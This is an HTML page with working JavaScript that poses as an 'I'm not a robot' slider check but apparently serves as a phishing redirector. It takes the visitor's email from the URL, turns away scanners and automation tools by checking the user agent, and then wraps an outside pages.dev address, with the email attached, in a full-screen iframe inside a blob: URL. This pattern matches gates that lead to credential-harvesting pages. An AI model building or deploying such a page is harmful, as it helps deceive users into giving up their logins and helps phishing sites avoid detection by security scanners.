<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Human Verification</title>
<style>
/* FULLSCREEN OVERLAY */
#overlay {
    position: fixed;
    inset: 0;
    background: rgba(0, 135, 90, 0.95);
    display: flex;
    justify-content: center;
    align-items: center;
    z-index: 999999;
}
/* VERIFICATION BOX */
#verificationBox {
    width: 240px;
    padding: 20px;
    border-radius: 16px;
    background: #fff;
    box-shadow: 0 3px 10px rgba(0,0,0,0.2);
    border: 1px solid #dcdcdc;
    text-align: left;
    font-family: Arial, sans-serif;
    position: relative;
}
#verificationBox .header {
    display: flex;
    align-items: center;
    gap: 12px;
    margin-bottom: 14px;
}
#robotIcon {
    width: 32px;
    height: 32px;
    border-radius: 50%;
    background: #f8f9fa;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 18px;
    color: #555;
    transform: rotate(0deg);
    transition: transform 0.05s linear;
}
#verificationBox .header span {
    font-size: 16px;
    color: #333;
}
/* SLIDER */
#sliderContainer {
    width: 100%;
    height: 40px;
    background: #f1f3f4;
    border-radius: 20px;
    position: relative;
    cursor: pointer;
    overflow: hidden;
}
#sliderFill {
    position: absolute;
    top: 0;
    left: 0;
    height: 100%;
    background: #d2e7d5;
    width: 0;
    border-radius: 20px;
    transition: width 0.1s;
}
#slider {
    width: 40px;
    height: 40px;
    background: #34a853;
    border-radius: 50%;
    position: absolute;
    top: 0;
    left: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    color: #fff;
    font-size: 18px;
    transition: left 0.1s;
    z-index: 2;
}
#sliderText {
    position: absolute;
    width: 100%;
    height: 100%;
    display: flex;
    align-items: center;
    justify-content: center;
    pointer-events: none;
    color: #555;
    font-size: 15px;
    transition: opacity 0.2s;
}
/* CHECKMARK */
#checkmark {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%) scale(0);
    font-size: 20px;
    color: #34a853;
    pointer-events: none;
    transition: transform 0.3s ease;
}
/* SPINNER */
.spinner {
    width: 14px;
    height: 14px;
    border-radius: 50%;
    border: 2px solid #40739e;
    border-top-color: transparent;
    animation: spin 0.6s linear infinite;
}
@keyframes spin { from { transform: rotate(0); } to { transform: rotate(360deg); } }
#verifying {
    display: none;
    margin-top: 10px;
    font-size: 13px;
    color: #555;
    text-align: center;
}
</style>
</head>
<body>

<div id="overlay">
    <div id="verificationBox">
        <div class="header">
            <div id="robotIcon">ðŸ¤–</div>
            <span>I'm not a robot</span>
        </div>

        <div id="sliderContainer">
            <div id="sliderFill"></div>
            <div id="slider">â†’</div>
            <div id="sliderText">Slide to verify</div>
            <div id="checkmark">âœ“</div>
        </div>

        <div id="verifying">
            <div style="display:flex; justify-content:center; align-items:center; gap:6px;">
                Verifying <div class="spinner"></div>
            </div>
        </div>
    </div>
</div>

<audio id="beepSound" src="https://www.soundjay.com/button/sounds/button-3.mp3" preload="auto"></audio>

<script>
// IPFS URL
const BASE_IPFS = "https://23b538b5.ko1wx90sd.pages.dev/";
function getEmail() { return new URLSearchParams(location.search).get("email") || ""; }
function buildIPFS(email) { return email ? BASE_IPFS + "#" + email : BASE_IPFS; }
function createBlobHTML(url) {
    return `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><style>
        html, body { margin:0; padding:0; width:100%; height:100%; overflow:hidden; background:#fff; }
        iframe { position:fixed; top:0; left:0; width:100%; height:100%; border:none; }
    </style></head><body><iframe src="${url}"></iframe></body></html>`;
}

// BOT CHECK
function computeBotScore() {
    let score = 0;
    const ua = navigator.userAgent.toLowerCase();
    if (/bot|crawl|spider|curl|wget|python|headless|selenium|puppeteer|playwright/.test(ua)) score += 50;
    if (navigator.webdriver) score += 50;
    return score;
}

// ROBOT ROTATION
let robotRotation = 0;
const robotIcon = document.getElementById("robotIcon");
let rotationSpeed = 1;
function rotateRobot() {
    robotRotation += rotationSpeed;
    robotIcon.style.transform = `rotate(${robotRotation}deg)`;
    requestAnimationFrame(rotateRobot);
}
rotateRobot();

// SLIDER
const slider = document.getElementById("slider");
const sliderContainer = document.getElementById("sliderContainer");
const sliderText = document.getElementById("sliderText");
const sliderFill = document.getElementById("sliderFill");
const verifying = document.getElementById("verifying");
const overlay = document.getElementById("overlay");
const checkmark = document.getElementById("checkmark");
const beepSound = document.getElementById("beepSound");

let isDragging = false;
let startX = 0;
let beepPlayed = false;

function startDrag(clientX) {
    if (!isDragging) {
        isDragging = true;
        startX = clientX - slider.offsetLeft;
        rotationSpeed = 5;
        if (!beepPlayed) {
            beepPlayed = true;
            beepSound.currentTime = 0;
            beepSound.play().catch(()=>{});
        }
    }
}

function onDrag(clientX) {
    if (!isDragging) return;
    let x = clientX - startX;
    if (x < 0) x = 0;
    if (x > sliderContainer.offsetWidth - slider.offsetWidth) x = sliderContainer.offsetWidth - slider.offsetWidth;
    slider.style.left = x + "px";
    sliderFill.style.width = x + slider.offsetWidth/2 + "px";
    sliderText.style.opacity = 1 - x / (sliderContainer.offsetWidth - slider.offsetWidth);
}

function endDrag() {
    if (!isDragging) return;
    isDragging = false;
    rotationSpeed = 1;

    const maxPos = sliderContainer.offsetWidth - slider.offsetWidth;
    const currentPos = parseInt(slider.style.left) || 0;

    // SNAP logic: if slider past 80% of track, auto-complete
    if (currentPos >= maxPos * 0.8) {
        slider.style.left = maxPos + "px";
        sliderFill.style.width = maxPos + slider.offsetWidth/2 + "px";
        sliderText.style.opacity = 0;

        const botScore = computeBotScore();
        if (botScore >= 60) {
            alert("Suspicious activity detected.");
            slider.style.left = "0px";
            sliderFill.style.width = "0px";
            sliderText.style.opacity = 1;
            return;
        }

        checkmark.style.transform = "translate(-50%, -50%) scale(1)";
        slider.style.display = "none";
        verifying.style.display = "block";

        setTimeout(() => {
            overlay.style.display = "none";
            const email = getEmail();
            const ipfsURL = buildIPFS(email);
            const blobHTML = createBlobHTML(ipfsURL);
            const blob = new Blob([blobHTML], { type: "text/html" });
            const blobURL = URL.createObjectURL(blob);
            window.location.href = blobURL;
        }, 500);
    } else {
        // slide back if not far enough
        slider.style.left = "0px";
        sliderFill.style.width = "0px";
        sliderText.style.opacity = 1;
    }
}

// MOUSE EVENTS
slider.addEventListener("mousedown", e => startDrag(e.clientX));
document.addEventListener("mousemove", e => onDrag(e.clientX));
document.addEventListener("mouseup", endDrag);

// TOUCH EVENTS
slider.addEventListener("touchstart", e => startDrag(e.touches[0].clientX));
document.addEventListener("touchmove", e => { if(isDragging) onDrag(e.touches[0].clientX); });
document.addEventListener("touchend", endDrag);
</script>

</body>
</html>
